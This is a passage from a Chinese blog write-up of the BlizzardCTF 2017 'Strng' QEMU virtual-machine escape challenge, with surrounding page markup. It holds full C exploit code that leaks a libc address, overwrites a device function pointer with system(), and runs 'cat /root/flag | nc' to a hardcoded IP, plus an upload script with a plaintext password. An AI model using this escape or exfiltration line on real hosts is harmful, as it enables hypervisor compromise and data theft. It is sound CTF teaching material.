MAP_MASK (MAP_SIZE - 1)</span><br><span class="line"></span><br><span class="line">unsigned int pmio_base = 0xc050;</span><br><span class="line">char* pci_device_name = &quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;;</span><br><span class="line">// unsigned int mmio_addr_base = 0xfebf1000;</span><br><span class="line">// unsigned int mmio_size = 256;</span><br><span class="line"></span><br><span class="line">void pmio_write(unsigned int val, unsigned int addr) &#123;</span><br><span class="line">    outl(val, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void pmio_arb_write(unsigned int val, unsigned int offset) &#123;</span><br><span class="line">    // 假如offset右移2的值为1，3会调用rand和rand_r</span><br><span class="line">    int tmp = offset &gt;&gt; 2;</span><br><span class="line">    if ( tmp == 1 || tmp == 3) &#123;</span><br><span class="line">        puts(&quot;PMIO write address is a command&quot;);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    pmio_write(offset, pmio_base);</span><br><span class="line">    pmio_write(val, pmio_base + 4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int pmio_read(unsigned int offset) &#123;</span><br><span class="line">    if (offset == 0) &#123;</span><br><span class="line">        // 获取opaque-&gt;addr的值,其实这题没用到这功能</span><br><span class="line">        return inl(pmio_base);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        // 设置opaque-&gt;addr的值为offset，再将opaque-&gt;regs[offset &gt;&gt; 2]的值读出，其中regs为uint_32_t类型</span><br><span class="line">        pmio_write(offset, pmio_base);</span><br><span class="line">        return inl(pmio_base + 4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void mmio_write(unsigned int val, unsigned int offset) &#123;</span><br><span class="line">    int fd;</span><br><span class="line">    void *map_base, *virt_addr;</span><br><span class="line">    if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123;</span><br><span class="line">        perror(&quot;open pci device&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);</span><br><span class="line">    if(map_base == (void *) -1) &#123;</span><br><span class="line">        perror(&quot;mmap&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    virt_addr = map_base + (offset &amp; MAP_MASK);</span><br><span class="line">    *((unsigned int*) virt_addr) = val;</span><br><span class="line">    if(munmap(map_base, MAP_SIZE) == -1) &#123;</span><br><span class="line">        perror(&quot;munmap&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unsigned int mmio_read(unsigned int offset) &#123;</span><br><span class="line">    int fd;</span><br><span class="line">    void *map_base, *virt_addr;</span><br><span class="line">    if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123;</span><br><span class="line">        perror(&quot;open pci device&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    map_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);</span><br><span class="line">    if(map_base == (void *) -1) &#123;</span><br><span class="line">        perror(&quot;mmap&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    virt_addr = map_base + (offset &amp; MAP_MASK);</span><br><span class="line">    if(munmap(map_base, MAP_SIZE) == -1) &#123;</span><br><span class="line">        perror(&quot;munmap&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    return *((unsigned int*) virt_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    unsigned long long  srand_addr;</span><br><span class="line">    unsigned long long  libc_base;</span><br><span class="line">    unsigned long long  system_addr;</span><br><span class="line"></span><br><span class="line">    // 获得端口访问权限</span><br><span class="line">    if (0 != iopl(3)) &#123;</span><br><span class="line">        perror(&quot;iopl permissions&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // leak srand, 分两次一次泄露4个byte</span><br><span class="line">    // 泄露高位，再泄露低位</span><br><span class="line">    srand_addr = pmio_read(0x108);</span><br><span class="line">    srand_addr = srand_addr &lt;&lt; 32;</span><br><span class="line">    srand_addr = srand_addr | pmio_read(0x104);</span><br><span class="line">    printf(&quot;srand_addr: %llx\n&quot;, srand_addr);</span><br><span class="line">    system_addr = srand_addr + 43712;</span><br><span class="line">    printf(&quot;system_addr: %llx\n&quot;, system_addr);</span><br><span class="line"></span><br><span class="line">// 将我们要执行的命令写入MMIO，从rand_r偏移8处开始写，因为调用的时候是opaque-&gt;rand_r(&amp;opaque-&gt;regs[2]);</span><br><span class="line">// &gt;&gt;&gt; from pwn import *</span><br><span class="line">// &gt;&gt;&gt; map(hex, unpack_many(&quot;cat /root/flag | nc 192.168.52.181 12345&quot;))</span><br><span class="line">// [&apos;0x20746163&apos;, &apos;0x6f6f722f&apos;, &apos;0x6c662f74&apos;, &apos;0x7c206761&apos;, &apos;0x20636e20&apos;, &apos;0x2e323931&apos;, &apos;0x2e383631&apos;, &apos;0x312e3235&apos;, &apos;0x31203138&apos;, &apos;0x35343332&apos;]</span><br><span class="line">    mmio_write(0x6f6f722f, 0xc);</span><br><span class="line">    mmio_write(0x20746163, 8);</span><br><span class="line">    mmio_write(0x6c662f74, 0x10);</span><br><span class="line">    mmio_write(0x7c206761, 0x14);</span><br><span class="line">    mmio_write(0x20636e20, 0x18);</span><br><span class="line">    mmio_write(0x2e323931, 0x1c);</span><br><span class="line">    mmio_write(0x2e383631, 0x20);</span><br><span class="line">    mmio_write(0x312e3235, 0x24);</span><br><span class="line">    mmio_write(0x31203138, 0x28);</span><br><span class="line">    mmio_write(0x35343332, 0x2c);</span><br><span class="line"></span><br><span class="line">    // 改写rand_r指针为system</span><br><span class="line">    pmio_arb_write(system_addr , 0x114);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 调用 strng_mmio_write中addr &gt;&gt; 2为3时候的分支，即调用opaque-&gt;rand_r(&amp;opaque-&gt;regs[2])</span><br><span class="line">    // 666 并不重要可以随意写</span><br><span class="line">    // mmio_write(666, 12);</span><br><span class="line">    // 或者调用pmio也行(下面的666也是随意)</span><br><span class="line">    pmio_write(12, pmio_base);</span><br><span class="line">    pmio_write(666, pmio_base+4);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在主机伪造一个flag文件，就可以收到flag了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1575361440288.png" alt></p>
+<p>或者来个弹计算器也行，这个好像很装逼。。。</p>
+<p>system(“gnome-calculator”)就行</p>
+<p><img src="http://pic.giantbranch.cn/pic/1575364082905.png" alt></p>
+<h1 id="补充——关于编译与上传exp"><a href="#补充——关于编译与上传exp" class="headerlink" title="补充——关于编译与上传exp"></a>补充——关于编译与上传exp</h1><p>编译一般是静态编译了，这里目标系统是32的，本地调试上传exp我用scp，比赛的话据说是用base64。。。。。</p>
+<p>我写了个脚本，但是第二条命令，需要先ssh正常连接一次，信任那个公钥，才能正常使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/qemu_escape$ cat compile_uploadexp.sh</span><br><span class="line">gcc -o exp -m32 -static ./exp.c</span><br><span class="line">sshpass -p &quot;passw0rd&quot; scp -P 5555 exp ubuntu@127.0.0.1:/home/ubuntu</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>主要参考<br><a href="https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html" target="_blank" rel="noopener">https://uaf.io/exploitation/2018/05/17/BlizzardCTF-2017-Strng.html</a></p>
+<p>其他参考<br><a href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge</a><br><a href="https://web.cs.elte.hu/local/Linux-bible/IO-Port-Programming/node2.html" target="_blank" rel="noopener">https://web.cs.elte.hu/local/Linux-bible/IO-Port-Programming/node2.html</a><br><a href="http://man7.org/linux/man-pages/man2/ioperm.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/ioperm.2.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/" title="CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng">https://www.giantbranch.cn/2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/qemu/" rel="tag"># qemu</a>
+          
+            <a href="/tags/vm-escape/" rel="tag"># vm escape</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/04/windbg时间穿梭——利用Time Travel Debugging更方便地调试漏洞/" rel="next" title="windbg时间穿梭——利用Time Travel Debugging更方便地调试漏洞">
+                <i class="fa fa-chevron-left"></i> windbg时间穿梭——利用Time Travel Debugging更方便地调试漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/01/02/CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu/" rel="prev" title="CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu">
+                CTF QEMU 虚拟机逃逸之HITB-GSEC-2017-babyqemu <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#熟悉题目"><span class="nav-number">1.</span> <span class="nav-text">熟悉题目</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#调试"><span class="nav-number">2.</span> <span class="nav-text">调试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MMIO相关函数"><span class="nav-number">3.</span> <span class="nav-text">MMIO相关函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PMIO函数"><span class="nav-number">4.</span> <span class="nav-text">PMIO函数</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">5.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补充——关于编译与上传exp"><span class="nav-number">6.</span> <span class="nav-text">补充——关于编译与上传exp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/';
+          this.page.identifier = '2019/12/03/CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng/';
+          this.page.title = 'CTF QEMU 虚拟机逃逸之BlizzardCTF 2017 Strng';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
